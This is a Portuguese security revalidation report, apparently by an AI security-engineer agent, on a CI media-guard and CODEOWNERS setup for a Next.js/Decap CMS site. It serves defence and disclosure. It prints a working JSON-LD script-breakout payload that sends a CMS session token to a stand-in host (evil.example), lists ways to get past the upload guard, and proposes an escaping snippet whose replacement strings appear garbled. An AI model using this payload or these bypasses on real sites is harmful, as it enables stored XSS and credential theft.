# Handoff 44 — Security Engineer — Revalidação final de SEC-P5-03 / SEC-P5-09 (media-guard)

**Task:** 001-migracao-stack
**Agente:** security-engineer
**Âmbito:** revalidar o controlo P1/P2/P3 desenhado em `handoff-42-architect-sec-p5-03-ci.md` e
implementado em `handoff-43-devops-media-guard.md`, contra os ficheiros **agora presentes em `main`**
(`d0fc996 Merge pull request #2`), contra a entrada de CSP de `next.config.mjs`, e contra a prova
empírica dos PR #2/#4 relatada pelo Orchestrator.
**Método:** leitura direta dos ficheiros no repositório local já mergeado; análise de contorno do
`media-guard`; reprodução do caminho de render de `components/OrganizationJsonLd.tsx` com o React
19.2.8 do próprio projeto. Não aceitei nenhuma afirmação como evidência sem a reproduzir ou sem
marcar explicitamente que não a consegui reproduzir.

---

STATUS: **BLOCKED**

Sem ambiguidade:

- **P1 (`.github/workflows/media-guard.yml`) — CONFORME.** Verificado contra as secções 3.3 e 3.4 do
  handoff-42, ponto a ponto. Não encontrei nenhuma violação das restrições.
- **P2 (required check em `main`) — ACEITE PARA O VETOR DE UPLOADS.** A prova do PR #4 é específica,
  falsificável e coerente; aceito-a. Ver VALIDATIONS 3 para o que prova e o que **não** prova.
- **P3 (`.github/CODEOWNERS` + Code Owner review) — NÃO PROVADO, e com evidência que aponta no
  sentido errado.** O merge do PR #2 foi feito pela conta GitHub `AgroTrades`
  (`agrotrades99@gmail.com`), não por `@virgilio-24`, que é o único code owner listado. A explicação
  dada ("o autor é o próprio code owner") **não é a única compatível com o observado** — SEC-P5-13.
- **P4 (CSP `/images/uploads/:path*`) — presente e inalterada.** Confirmado.
- **SEC-P5-03 / SEC-P5-09 — NÃO FECHADOS.** Não porque o `media-guard` esteja mal feito — está bem
  feito — mas porque encontrei **dois caminhos novos para o mesmo ativo que o `media-guard` não
  toca**, ambos na superfície que o desenho declarou explicitamente auto-fundível sem revisão humana.
- **Duas vulnerabilidades `high` novas (SEC-P5-11, SEC-P5-12).** Pela regra 1 do meu mandato, isto
  bloqueia o avanço até correção e reavaliação.

---

SUMMARY:

O trabalho do devops e o desenho do architect estão corretos naquilo que se propuseram fazer. O
workflow cumpre a especificação sem desvios: evento `pull_request` (nunca `pull_request_target`),
`permissions: contents: read` e nada mais, sem `paths:` e sem `if:`, `actions/checkout` fixado pelo
SHA `11bd719...` e não por tag, lógica inteiramente dentro do ficheiro, nome do job `media-guard`
tratado como contrato e documentado. A allowlist, a verificação de assinatura de bytes e o limite de
5 MB estão implementados tal como 3.3 os descreve. Não tenho reparos a P1.

O problema não está em P1. Está na **premissa que torna P1 suficiente**.

O handoff-42 desenhou uma fronteira de confiança com duas superfícies: a auto-fundível pelo editor
(`content/**` e `public/images/uploads/**`) e "tudo o resto", protegido por revisão de code owner.
Justificou deixar `content/**` sem dono humano com a frase, em `.github/CODEOWNERS` linhas 29-30,
"ausência de código executável em content/ (apenas dados YAML/Markdown consumidos em build)".

**Essa frase é falsa contra o repositório, de duas maneiras independentes, e verifiquei ambas.**

Primeira: `content/` **não contém apenas dados**. Contém seis módulos TypeScript —
`content/index.ts`, `content/organization.ts`, `content/routes.ts`, `content/seo.ts`,
`content/service-slugs.ts`, `content/schemas/index.ts` — compilados para o bundle e a correr na mesma
origem que `/admin`. A regra `/content/` do CODEOWNERS retira-lhes o dono. Um editor com escrita abre
um PR que altera `content/organization.ts`, o `media-guard` passa (nada sob `uploads/`), nenhum code
owner é chamado, o PR funde-se, e o JavaScript do editor passa a correr em todas as páginas. Nenhum
SVG, nenhum `%2F`, nenhuma engenharia social.

Segunda, e pior porque não precisa sequer de tocar em código: **os dados JSON que o Decap edita
chegam a um `<script>` sem escape.** `components/OrganizationJsonLd.tsx` faz
`dangerouslySetInnerHTML` com `JSON.stringify(organizationJsonLd)`, e `content/organization.ts`
constrói esse objeto a partir de `content/site/contacts.json`, `locations.json` e `meta.json` —
ficheiros editáveis no Decap, na superfície sem dono. `JSON.stringify` não escapa `<` nem `/`.
Reproduzi o render com o React do próprio projeto e obtive um `</script>` literal a fechar o bloco
`ld+json` e um `<script>` a seguir, com sintaxe JavaScript válida (output literal em VALIDATIONS 5).
A CSP global permite `script-src 'self' 'unsafe-inline'`, portanto executa; a exfiltração sai por
navegação de topo, exatamente como no SEC-P5-09, que nenhuma CSP restringe.

O comentário desse componente diz "JSON-LD estático, gerado a partir de content/, nunca de input de
utilizador". Depois da Fase 5, `content/` **é** input de utilizador — é literalmente o que o Decap
existe para editar. O comentário estava certo na Fase 4 e passou a estar errado quando o CMS entrou,
e ninguém o reviu. É o mesmo padrão que penalizei no SEC-P5-10.

Isto reformula o achado central. Eu escrevi no handoff-41 que "o único controlo que o adversário não
consegue contornar do browser dele é impedir que o ficheiro exista", e o architect concluiu daí que a
defesa tem de atuar na política de merge. **Ambos temos razão na conclusão e ambos a aplicámos a um
âmbito demasiado estreito.** Trancámos `public/images/uploads/` e deixámos `content/` — a outra
metade da mesma superfície auto-fundível — sem tranca nenhuma, por uma suposição sobre o conteúdo
dessa pasta que ninguém foi verificar. O erro é meu tanto quanto do architect: revalidei o desenho de
P1 sem olhar para o que a exceção de P3 estava a libertar.

Sobre a limitação da conta única, que o Orchestrator me pediu para avaliar: **em circunstâncias
normais tê-la-ia aceite como resíduo**, convertida em gate obrigatório no momento em que o segundo
colaborador recebesse escrita. Mas ela deixou de ser teórica: o merge do PR #2 foi feito pela conta
`AgroTrades`, e o code owner listado é `@virgilio-24`. Ou são a mesma pessoa com duas contas — e nesse
caso **o teste em falta é possível hoje** — ou `@virgilio-24` não é colaborador, e nesse caso o GitHub
ignora a regra em silêncio e P3 é inerte. As duas hipóteses produzem exatamente a mesma UI que foi
observada. Não escolho entre elas por simpatia com a que dá jeito.

---

ARTIFACTS:

- `project/state/task-001-migracao-stack/handoff-44-security-engineer-sec-p5-03-fechamento.md` (este ficheiro)
- **Nenhum ficheiro do repositório criado ou alterado por mim.** `git status --porcelain` mantém as
  mesmas 88 entradas do início da sessão; `content/site/contacts.json` continua com
  `"company": "AGRO TRADES, LDA"`, inalterado.
- A prova de SEC-P5-11 foi feita fora do repositório, replicando o caminho de render com o
  `react`/`react-dom` do próprio projeto. Tentei primeiro a prova mais forte (injetar o payload em
  `content/site/contacts.json`, `npm run build`, procurar no HTML gerado); essa tentativa foi
  **bloqueada pelo classificador de permissões do ambiente**, não insisti nem procurei contorná-la, e
  registo-a como limitação do meu método.

---

VALIDATIONS

### 1. Estado do repositório — verificado, não presumido

```
git log --oneline -3
  d0fc996 Merge pull request #2 from AgroTrades/chore/media-guard-ci
  6b0078d ci: add media-guard workflow and CODEOWNERS
  98fc350 feat: fundacao Next.js e paridade visual da homepage (Fase 1)

git show --stat d0fc996
  .github/CODEOWNERS                |  32 ++++++
  .github/workflows/media-guard.yml | 220 +++++++++++++++++++++++++++
  author=AgroTrades <agrotrades99@gmail.com>  committer=GitHub <noreply@github.com>

git status --porcelain .github/   -> vazio (os ficheiros em disco SAO os que estao em main)
find .github -type f              -> .github/CODEOWNERS, .github/workflows/media-guard.yml (so estes)
grep -rn "pull_request_target|workflow_run|workflow_dispatch|secrets." .github/
  -> 1 unica ocorrencia, num COMENTARIO a proibir pull_request_target. Nenhum uso real.
```

Os ficheiros que li são os que estão em `main`. Não há outros workflows no repositório.

### 2. P1 contra a especificação (handoff-42, 3.3 e 3.4) — CONFORME em todos os pontos

| Exigência (handoff-42) | Verificado em `media-guard.yml` | Resultado |
|---|---|---|
| Evento `pull_request`, nunca `pull_request_target` | linha 40 | **OK** |
| `permissions: contents: read` e nada mais | linhas 49-50 | **OK** |
| Sem `paths:` no trigger | trigger só com `branches` e `types` | **OK** |
| Sem `if:` que salte o job | nenhum `if:` no ficheiro | **OK** |
| Nome do job = contrato, documentado | `jobs.media-guard.name: media-guard`, linhas 19-23 | **OK** |
| Não executa código vindo do PR | heredoc Node; sem `npm ci`, sem script do repo | **OK** |
| Ações de terceiros fixadas por SHA | `actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683` | **OK** |
| Diff `--diff-filter=ACMR -M -C` contra merge base | linha 129, `BASE...HEAD` (três pontos) | **OK** |
| 3.3(1) caminho plano, sem subdiretórios, sem `..`, sem ponto inicial | linha 153 | **OK** |
| 3.3(2) allowlist por regex, extensão case-insensitive, denylist só na mensagem | 80-81, 162-174 | **OK** |
| 3.3(3) assinatura de bytes por extensão (PNG/JPEG/GIF/WEBP/AVIF) | 83-112, 193-202 | **OK** |
| 3.3(4) limite de 5 000 000 bytes | 79, 188-191 | **OK** |
| Mensagem nomeia o ficheiro e diz o que fazer | 155-171, 196-199 | **OK** |
| Falha fechada (`process.exit(1)`) em todos os modos de erro | 120-123, 132-136, 207-217 | **OK** |

Verifiquei também o comportamento por omissão: se `BASE_SHA`/`HEAD_SHA` vierem vazios, o job **falha**
(linhas 120-123) em vez de passar. Falha fechada — o inverso do erro que apanhei no SEC-P5-02.

`.github/CODEOWNERS` corresponde a 3.2/3.5 na **forma**: regra geral `* @virgilio-24` primeiro, duas
exceções sem dono depois (`/content/`, `/public/images/uploads/`). O problema não é a forma, é o
**âmbito** de uma dessas exceções — SEC-P5-12.

### 3. Análise da prova dos PR #2 e #4 — o que aceito e o que não aceito

**PR #4 (`AgroTrades-patch-2`, `f8e4bd5`, adiciona `public/images/uploads/teste-pr-2.svg`) — ACEITO.**
Os detalhes relatados são específicos e falsificáveis, e cada um corresponde a algo que só acontece se
a peça respetiva estiver mesmo no sítio: "Failing after 4s" só existe se o job correu num runner; a
etiqueta "Required" ao lado de `media-guard / media-guard (pull_request)` só aparece se o check está
registado na proteção de branch; o botão de merge desativado só acontece se a proteção está ativa.
Isto prova, e dou por provado:

- o workflow dispara em `pull_request` contra `main`;
- o heredoc Node corre corretamente no runner (a única coisa que os 9 testes offline do devops não
  cobriam neste ponto);
- a regra da allowlist rejeita `.svg` sob `public/images/uploads/` e sai com código diferente de zero;
- o check está registado como **required** e o merge fica indisponível.

Ou seja: **P1 + P2 estão provados para o vetor literal do SEC-P5-03.** É mais do que o handoff-43
tinha, e é suficiente para esse vetor.

**O que a prova do PR #4 não prova, e não tomo por provado:**

1. A verificação de **assinatura de bytes** (3.3(3)) nunca correu no runner real. O PR #4 usou um
   `.svg`, rejeitado pela extensão na linha 162, antes de qualquer byte ser lido. O caso que a
   assinatura existe para apanhar (SVG/HTML com o nome `x.png`) só foi exercitado **offline** pelo
   devops. É provável que funcione, mas "provável" não é o padrão que apliquei a mim próprio no
   handoff-41.
2. A prova (b) que o architect exigiu — um PR que altera **só** texto em `content/`, que tem de
   reportar o check verde **e ficar fundível sem espera de code owner** — **não foi executada.** Foi
   substituída por PR #2, que toca em `.github/**`: superfície diferente, teste diferente. A exceção
   de CODEOWNERS continua tão por verificar como estava no handoff-43.
3. Nada sobre `Settings -> Actions` foi verificado por mim; aceito o relato e registo que não é
   evidência reproduzível.

**PR #2 — NÃO ACEITO a interpretação dada.** Ver SEC-P5-13.

### 4. Contornos do `media-guard` que analisei de raiz

Método do SEC-P5-09: não perguntar "a regra está lá?", mas "que caminho entrega o mesmo resultado sem
passar pela regra?".

| Tentativa de contorno | Resultado da análise |
|---|---|
| `public/images/uploads/x.svg` | **bloqueado** por P1 (provado no PR #4) |
| `public/images/uploads/x.png` com bytes de SVG | bloqueado pela assinatura (só provado offline) |
| `public/images/uploads/x.png.svg` (extensão dupla) | bloqueado pela allowlist |
| `public/images/uploads/sub/x.svg` (subdiretório) | bloqueado pela regra de caminho |
| nome iniciado por ponto (`.htaccess`) | bloqueado pela regra de caminho |
| nome com homóglifos/Unicode | bloqueado — allowlist ASCII estrita |
| `.PNG` maiúsculo | aceite pela regex `/i`, mas a assinatura é verificada na mesma. Sem problema |
| **`public/images/Uploads/x.svg` (pasta com maiúscula)** | **escapa a P1** — o `startsWith` é case-sensitive; escapa também à CSP, que faz match de caminho. Cai em `*` no CODEOWNERS, logo depende inteiramente de P3. Ver SEC-P5-14 |
| symlink `x.png` a apontar para outro sítio | `statSync` segue o link: alvo inexistente falha; alvo PNG genuíno passa e é inofensivo. Sem vetor |
| polyglot GIF/PNG válido com HTML anexado | sem vetor de script: o `Content-Type` vem da extensão e os browsers não fazem sniffing de `image/*` declarado para HTML |
| PR só de remoção (status `D`) | fora de `ACMR`, passa — correto, um ficheiro apagado não é servido |
| PR que reescreve o próprio `media-guard.yml` | é o cenário que P3 existe para travar, e **P3 não está provado** — SEC-P5-13 |
| **PR que altera `content/*.ts`** | **passa sem check e sem revisor** — SEC-P5-12 |
| **PR (ou publicação normal no Decap) que altera `content/site/contacts.json`** | **passa sem check e sem revisor, e injeta script** — SEC-P5-11 |

As três últimas linhas são o achado desta revalidação.

### 5. SEC-P5-11 — reprodução literal

Caminho de render replicado com o `react@19.2.8` e o `react-dom/server` **do próprio projeto**,
idêntico ao de `components/OrganizationJsonLd.tsx`. Payload colocado em `ceo.company`, que é
`contacts.ceo.company` de `content/site/contacts.json` — campo exposto no Decap como
`{ label: "Empresa", name: company, widget: string, required: true }` (`public/admin/config.yml`
linha 581) e validado por `z.string().trim().min(1)` (`content/schemas/index.ts` linha 465), ou seja
**sem qualquer restrição de caracteres**.

HTML emitido (literal, quebrado em três linhas só para caber):

```html
<script type="application/ld+json">{"@context":"https://schema.org","@type":"Organization",
"name":"AgroTrades</script><script>fetch('https://evil.example/?t='+localStorage.getItem('decap-cms-user'))</script>",
"url":"https://agrotrades.co.mz"}</script>
```

```
contem "</script><script>" literal : true
nr de "</script" no output          : 3   (havia de ser 1)
sintaxe JS do script injetado       : VALIDA   (verificado com new Function(...))
```

O parser de HTML fecha o bloco `ld+json` no primeiro `</script>` e trata o resto como `<script>`
inline normal. `JSON.stringify` escapa `"` e `\`, mas não `<`, `>` nem `/`; por isso usei um payload
só com plicas, e confirmei que o JavaScript resultante compila (uma primeira tentativa com aspas
duplas produzia `\"` e era inválida — um atacante corrige isso em trinta segundos, e eu corrigi-o,
para não reportar um falso positivo).

Cadeia completa, com todos os elos verificados no repositório:

1. Editor edita "Empresa" no Decap (ou altera `content/site/contacts.json` num PR direto).
2. `publish_mode: editorial_workflow` abre PR. `media-guard` passa — nada sob `public/images/uploads/`.
3. `/content/` está sem dono no CODEOWNERS, **por desenho** -> nenhuma revisão humana. PR funde-se.
4. `content/organization.ts` lê `contacts.ceo.company` (linha 25) e `OrganizationJsonLd` renderiza-o
   sem escape em `app/(pt)/page.tsx:19` e `app/en/page.tsx:19` — **as duas homepages**.
5. CSP global: `script-src 'self' 'unsafe-inline'` -> o script inline injetado **executa**.
6. `localStorage.getItem('decap-cms-user')` — chave confirmada por mim no bundle instalado
   (1 ocorrência em `public/admin/vendor/decap-cms/decap-cms.js`) — na mesma origem que `/admin`.
7. Exfiltração: `connect-src 'self'` e `img-src 'self' data:` bloqueiam `fetch`/imagem, mas **não
   bloqueiam navegação de topo** (`location = ...`). É a mesma saída do SEC-P5-09, e nenhuma CSP a
   fecha.

Outros campos com o mesmo caminho, todos sem restrição de caracteres: `contacts.phones[0]`
(-> `telephone`), `locations[].name` e `locations[].address[0]` (-> `PostalAddress`), `meta.siteUrl` e
`meta.ogImage` (-> `url`/`logo`).

### 6. P4 — a CSP de `/images/uploads/:path*` continua lá e inalterada

`next.config.mjs`, entrada intermédia do array (entre a global e a de `/admin`):

```
source: "/images/uploads/:path*"
  X-Content-Type-Options: nosniff
  Content-Security-Policy: sandbox; default-src 'none'
```

Idêntica à que descrevi no handoff-41. O comentário já incorpora a correção do SEC-P5-10 (nomeia o
`%2F` e diz que é defesa em profundidade). Continua correto mantê-la, e continua correto não a tratar
como controlo. Pendência menor: o comentário ainda diz que o Action está "ainda por desenhar/adicionar
— ver esse workflow quando existir"; existe desde `d0fc996`. Ver SEC-P5-16.

---

ISSUES

| Ref | Severidade | Título | Estado |
|---|---|---|---|
| SEC-P5-11 | **high** | **NOVO** — Injeção de script via JSON-LD a partir de `content/site/*.json`, superfície sem revisão | **ABERTO — BLOQUEIA** |
| SEC-P5-12 | **high** | **NOVO** — Exceção `/content/` do CODEOWNERS cobre módulos TypeScript executáveis | **ABERTO — BLOQUEIA** |
| SEC-P5-13 | medium | **NOVO** — P3 não provado; conta que fez o merge (`AgroTrades`) != code owner (`@virgilio-24`) | **ABERTO** |
| SEC-P5-14 | low-medium | **NOVO** — `public/images/Uploads/` (maiúscula) escapa a P1 e à CSP; depende só de P3 | **ABERTO** |
| SEC-P5-15 | low | **NOVO** — `z.string().url()` aceita `javascript:`/`data:`; mitigado por React 19 e pela CSP, não pela validação | aceite com nota |
| SEC-P5-16 | low | Comentários desatualizados (`config.yml` ~50-55, `next.config.mjs`, `OrganizationJsonLd.tsx`) | **ABERTO** |
| SEC-P5-03 | medium | SVG na media library rouba o token de outro editor | vetor literal **fechado** por P1+P2; achado **não fechado** (ver 11/12) |
| SEC-P5-09 | medium | CSP contornável com `%2F` | mitigado por P1+P2 para uploads; o achado sobrevive por outra via |
| SEC-01 (herdado) | **high** | Segredos no ambiente Preview da Vercel | **ABERTO** — inalterado, fora deste âmbito |

#### SEC-P5-11 — high — NOVO — Injeção de script via JSON-LD, na superfície auto-fundível

Reprodução, impacto e cadeia completa em VALIDATIONS 5. O que decide a severidade:

- **Não precisa de interação da vítima.** O SEC-P5-03 exigia convencer outro editor a abrir um
  ficheiro específico como documento de topo. Aqui basta que o editor visite a homepage enquanto tem
  sessão no CMS — ou seja, o comportamento normal de quem acabou de publicar.
- **Não afeta só editores.** É XSS armazenado nas duas homepages de produção, servido a **todos os
  visitantes**. O ativo deixa de ser apenas o token de um segundo editor.
- **Não precisa de um segundo editor para ser real.** Com um único editor, o SEC-P5-03 era risco nulo
  (vítima e atacante seriam a mesma pessoa). Aqui não: basta que a **única** conta com escrita seja
  comprometida para existir um caminho, sem revisão humana, até JavaScript arbitrário no site de
  produção. Isto desliga a precondição temporal "antes do segundo editor" que sustentava toda a
  calendarização deste risco.
- Pré-condição: um editor autenticado com escrita, ou o comprometimento da conta que a tem.

Não é `critical` porque exige essa posição privilegiada; não é `medium` porque nada na cadeia depende
de o alvo cooperar e porque o alcance é o público do site, não uma pessoa.

**Correção exigida (`developer`):** escapar o payload antes de o injetar —

```
JSON.stringify(organizationJsonLd)
  .replace(/</g, "\u003c")
  .replace(/\u2028/g, "\u2028")
  .replace(/\u2029/g, "\u2029")
```

`\u003c` continua a ser JSON válido e o `ld+json` mantém-se legível pelos motores de busca. **E
corrigir o comentário do componente**, que hoje afirma "nunca de input de utilizador".

Aceito também, em acréscimo, validar em `content/schemas/index.ts` que os campos que chegam ao JSON-LD
não contêm `<`. **Não aceito só a validação de schema**: o schema corre no build, o escape é no ponto
de saída, e é no ponto de saída que a garantia tem de estar. Prefiro as duas; exijo pelo menos a do
ponto de saída.

**Revalidação que vou exigir:** o HTML gerado por `npm run build` para `/` e `/en`, com o payload
literal de VALIDATIONS 5 em `contacts.ceo.company`, contendo **exatamente um** `</script` na
vizinhança do bloco `ld+json`. Não aceito a leitura do diff.

#### SEC-P5-12 — high — NOVO — A exceção `/content/` liberta código executável

`.github/CODEOWNERS` linhas 31-32 retiram o dono a **todo** o `content/`. Mas `content/` contém:

```
content/index.ts          content/routes.ts        content/service-slugs.ts
content/organization.ts   content/seo.ts           content/schemas/index.ts
```

São módulos TypeScript compilados para o bundle, não dados. A justificação escrita no próprio ficheiro
("ausência de código executável em content/ — apenas dados YAML/Markdown consumidos em build") é
factualmente falsa contra o repositório, e é a única coisa que sustenta a exceção.

Consequência: um editor com escrita funde JavaScript arbitrário para `main` sem nenhum check e sem
nenhum revisor. É um caminho **mais curto** para o mesmo ativo do que aquele que o `media-guard` foi
construído para fechar, e o `media-guard` não o vê. Pelo critério do próprio handoff-42 — "um editor
que consiga fundir uma alteração a `app/` tem XSS trivial sem precisar de SVG nenhum" —
`content/*.ts` pertence à superfície de código e devia ter dono desde o início. Lapso de âmbito, não
de desenho.

**Correção exigida (`devops-engineer`, com validação do `software-architect`, por ser fronteira de
confiança):** estreitar a exceção às pastas de dados que o Decap realmente escreve, que são as únicas
declaradas em `public/admin/config.yml` (`folder: content/services`, `file: content/site/*.json`):

```
* @<code-owner-real>

/content/services/
/content/site/
/public/images/uploads/
```

Assim `content/*.ts` e `content/schemas/` voltam a cair na regra `*` e exigem revisão. **A correção
tem de ser verificada no GitHub, não deduzida** — a semântica de "última regra que faz match" continua
a ser a premissa não verificada de todo este desenho (SEC-P5-13).

Nota deliberada: mesmo com esta correção, `content/site/*.json` continua sem revisão — é o desenho, e
é aceitável **desde que** SEC-P5-11 seja corrigido, porque é isso que reduz esses ficheiros a dados
inertes. As duas correções valem em conjunto: 12 sem 11 deixa a injeção de pé; 11 sem 12 deixa a via
direta pelos `.ts` de pé.

#### SEC-P5-13 — medium — P3 não está provado, e há evidência a apontar noutro sentido

A interpretação apresentada para o PR #2 é: "o check passou e o merge ficou disponível sem revisão
porque o autor `@virgilio-24` é o próprio e único code owner, e o GitHub não pede a alguém que se
reveja a si mesmo". É plausível. **Não é a única compatível com o observado**, e há um dado no
repositório que a contraria:

```
git log --format="%h | author=%an <%ae>" -3
  d0fc996 | author=AgroTrades <agrotrades99@gmail.com>      <- quem fundiu o PR #2
  6b0078d | author=MADIGITAL\virgilio.jose <virgilio.jose@inovadigital.eu>
.github/CODEOWNERS:26 -> * @virgilio-24                     <- o unico code owner
```

Hipóteses compatíveis com "check verde, merge disponível, sem pedido de revisão":

- **(a)** `@virgilio-24` é colaborador com escrita e é o autor do PR -> o GitHub dispensa a
  auto-revisão. P3 está de pé e o teste é inconclusivo por falta de uma segunda conta.
- **(b)** `@virgilio-24` **não** é colaborador do repositório. O GitHub trata a regra como dono
  desconhecido, **não atribui revisor nenhum e não emite erro em runtime** — só um aviso na vista do
  ficheiro. P3 é inerte, e com P3 inerte o próprio handoff-42 diz, textualmente, que "P1 é teatro".
- **(c)** "Require review from Code Owners" está ligado mas a regra `*` não cobre `.github/**` como se
  espera.

Nada do que foi observado distingue (a) de (b). O merge ter sido feito pela conta `AgroTrades` e não
por `@virgilio-24` inclina a dúvida para (b), ou pelo menos torna (a) menos automática do que foi
apresentada. **Não fecho isto por confiança.**

**Verificações que resolvem a dúvida, por ordem crescente de esforço, exigidas antes de qualquer
aprovação:**

1. **A mais barata, trinta segundos, e resolve (b) sozinha:** abrir
   `https://github.com/AgroTrades/agrotrades/blob/main/.github/CODEOWNERS` na web. O GitHub mostra os
   donos reconhecidos por linha e um banner de erro do tipo "Unknown owner on line 26" se
   `@virgilio-24` não for colaborador com escrita. Um screenshot dessa vista, sem avisos, fecha (b).
2. `gh api repos/AgroTrades/agrotrades/branches/main/protection` (ou screenshot da regra) a mostrar
   `required_pull_request_reviews.require_code_owner_reviews: true` e `media-guard` em
   `required_status_checks.contexts`.
3. **O teste que continua em falta e que talvez já seja possível hoje:** se `AgroTrades` e
   `@virgilio-24` forem contas distintas, **já existem duas identidades** e o cenário real é testável
   agora — um PR aberto pela conta que **não** é code owner, a tocar em `.github/`, tem de ficar
   retido em "Review required". Se forem a mesma pessoa com uma só conta, isto passa a gate
   obrigatório no momento em que a segunda conta receber escrita.
4. A prova (b) do architect, nunca executada: um PR que só altera texto em `content/` tem de ficar
   fundível sem revisão — **depois** de SEC-P5-12 corrigido, e apontando a um ficheiro de
   `content/site/`, não a um `.ts`.

**Sobre a limitação da conta única — a pergunta que o Orchestrator me fez diretamente.** Resposta:
**seria resíduo aceitável, não é bloqueador por si só, e não é o que está a bloquear aqui.** O
raciocínio de que o ativo protegido pressupõe um segundo editor que ainda não existe está correto e
aceito-o, com uma condição não negociável: que passe a ser um **gate nomeado e obrigatório** — o
primeiro ato depois de conceder escrita ao segundo colaborador, e **antes** de lhe entregar acesso ao
CMS, é correr os testes 3 e 4 com a conta dele. Um resíduo que não tem dono nem momento é um resíduo
esquecido. O que me faz recusar hoje não é essa limitação; são o SEC-P5-11 e o SEC-P5-12, que existem
independentemente dela — e o facto de a verificação (1), gratuita e sem precisar de segunda conta,
nunca ter sido feita.

#### SEC-P5-14 — low-medium — `public/images/Uploads/` escapa a P1 e à CSP

`UPLOADS_PREFIX = 'public/images/uploads/'` com `startsWith` é case-sensitive (linha 143 do workflow).
Um ficheiro em `public/images/Uploads/x.svg` não é inspecionado por P1, e o
`source: "/images/uploads/:path*"` de `next.config.mjs` também não lhe faz match — fica servido sob a
CSP global permissiva, tal como no SEC-P5-09. O que sobra a travá-lo é P3 (o caminho cai na regra `*`,
porque os padrões de CODEOWNERS também são case-sensitive) — ou seja, exatamente a peça que não está
provada. Falha para o lado fechado **se** P3 funcionar.

Não é `medium` pleno porque o Decap escreve sempre no `media_folder` literal e nunca produz este
caminho sozinho; exige um commit deliberado pela API. **Correção (duas linhas, e recomendo-a
independentemente de P3):** comparar em minúsculas (`f.toLowerCase().startsWith(UPLOADS_PREFIX)`) e
recusar qualquer caminho que case em minúsculas mas não byte a byte, com mensagem própria.

#### SEC-P5-15 — low — `z.string().url()` aceita esquemas perigosos

Verificado contra o `zod@4.4.3` do projeto:

```
"javascript:alert(1)"               -> ACEITE
"data:text/html,<script>1</script>" -> ACEITE
```

`contacts.whatsapp.url` é `z.string().trim().url()` e é renderizado em `href` em cinco sítios,
incluindo `components/WhatsappFloat.tsx`, que está em **todas** as páginas. `mapEmbedUrl` vai para o
`src` de um `<iframe>`.

Testei o que acontece na prática, com o React do projeto:

```
<a href="javascript:...">     -> React 19 substitui por javascript:throw new Error('React has blocked a javascript: URL...')
<iframe src="javascript:..."> -> idem
```

Está fechado, mas **por duas camadas que não são a nossa validação**: o bloqueio de `javascript:` do
React 19 e o `frame-src 'self' youtube-nocookie google` da CSP (que barra um `data:` em iframe).
Registo-o como `low` e aceito-o, com a nota de método do handoff-41: um controlo que funciona por
acidente de dependência perde-se num upgrade sem ninguém dar por isso. **Recomendação (não
exigência):** apertar estes campos no schema a `^https?:` ou a um host esperado.

#### SEC-P5-16 — low — Comentários que afirmam um estado que já não é o real

Três, os dois primeiros já pedidos ao `developer` no handoff-42 e ainda por fazer (confirmei por
leitura direta):

- `public/admin/config.yml`, ~linhas 50-55: continua a dizer que "a defesa real e efetiva contra um
  SVG com script inline está em next.config.mjs". Depois do SEC-P5-09 é falso; a defesa real é o
  `media-guard`.
- `next.config.mjs`: o comentário da entrada de uploads diz que o Action está "ainda por
  desenhar/adicionar — ver esse workflow quando existir". Existe desde `d0fc996`; deve nomear
  `.github/workflows/media-guard.yml`.
- **Novo, meu:** `components/OrganizationJsonLd.tsx` linha 14 — "JSON-LD estático, gerado a partir de
  content/, **nunca de input de utilizador**". Cai com o SEC-P5-11, e é provavelmente a frase que fez
  toda a gente (eu incluído) passar os olhos por este ficheiro sem parar.

---

BLOCKERS:

1. **SEC-P5-11 (`high`)** — injeção de script via JSON-LD, a partir de dados editáveis no CMS, numa
   superfície desenhada para não ter revisão humana. XSS armazenado nas duas homepages de produção.
2. **SEC-P5-12 (`high`)** — a exceção `/content/` do CODEOWNERS liberta seis módulos TypeScript
   executáveis, permitindo fundir JavaScript arbitrário para `main` sem check e sem revisor.

Qualquer um dos dois basta. Pela regra 1 do meu mandato, `high` bloqueia até correção **e**
reavaliação — sem exceção por prazo, por o site não estar publicado, ou por o controlo anterior ter
ficado bem feito. **E fica registado sem rodeios: enquanto estes dois estiverem abertos, o
`media-guard` não fecha o SEC-P5-03.** Fecha o vetor literal do SVG na pasta de uploads, que é real e
está agora provado; não fecha o achado, porque o achado é "um editor injeta script na origem que detém
o token", e há duas vias mais curtas abertas ao lado.

3. **SEC-P5-13** não bloqueia sozinho, mas **impede-me de aprovar P1/P2/P3 como conjunto** mesmo
   depois de 1 e 2 corrigidos, porque o handoff-42 estabeleceu que as três peças valem tudo ou nada e
   P3 continua por provar. A verificação (1) do SEC-P5-13 é gratuita e não precisa de segunda conta.
4. **SEC-01** continua `high` e aberto — configuração da Vercel, `devops-engineer`, pré-condição de
   deploy. Inalterado, e fora do âmbito desta revalidação.

---

REQUIRES_HUMAN_NOTIFICATION: **true**

Por três razões independentes, qualquer uma suficiente:

1. **Duas vulnerabilidades `high` novas** (SEC-P5-11, SEC-P5-12), abertas, com prova reproduzível.
2. **SEC-01 continua `high` e aberto.**
3. Os `high` do `npm audit` (SEC-P5-07) mantêm-se sem correção disponível, na página que detém o
   token. Inalterado desde o handoff-41.

**O que o Orchestrator deve levar ao dono do projeto, em concreto e sem suavizar:**

- **O `media-guard` está bem feito e o teste dele funcionou.** O PR #4 é prova real de que um SVG na
  pasta de uploads fica bloqueado e não se pode fundir. Esse trabalho não foi em vão e não se desfaz.
- **Mas encontrei duas portas ao lado que ele não tranca**, e ambas são mais fáceis de usar do que a
  porta que trancámos. Uma delas — a do JSON-LD — nem precisa de um segundo editor para ser perigosa:
  quem fique com acesso à conta do CMS consegue pôr JavaScript à sua escolha na homepage, servido a
  todos os visitantes, sem que ninguém tenha de aprovar nada.
- **A causa é minha e do architect, não do devops.** Desenhámos a proteção para a pasta de imagens e
  deixámos a pasta `content/` explicitamente sem revisão, com base numa frase — "não tem código
  executável" — que ninguém verificou. Tem seis ficheiros TypeScript. Fui eu que revalidei esse
  desenho no handoff-41 sem olhar para o que a exceção libertava.
- **Uma coisa que se resolve em trinta segundos e vale a pena fazer já:** abrir `.github/CODEOWNERS`
  na página do GitHub e ver se aparece algum aviso de "unknown owner" na linha do `@virgilio-24`. O
  merge do PR #2 foi feito pela conta `AgroTrades`, e o code owner listado é `@virgilio-24` — se não
  forem a mesma conta com escrita, a peça CODEOWNERS não está a fazer nada, e sem ela o próprio
  architect escreveu que o `media-guard` "é teatro".
- **As correções são pequenas:** três linhas no componente do JSON-LD, duas linhas no CODEOWNERS, e
  duas verificações no painel do GitHub. Não é preciso repensar nada do desenho.
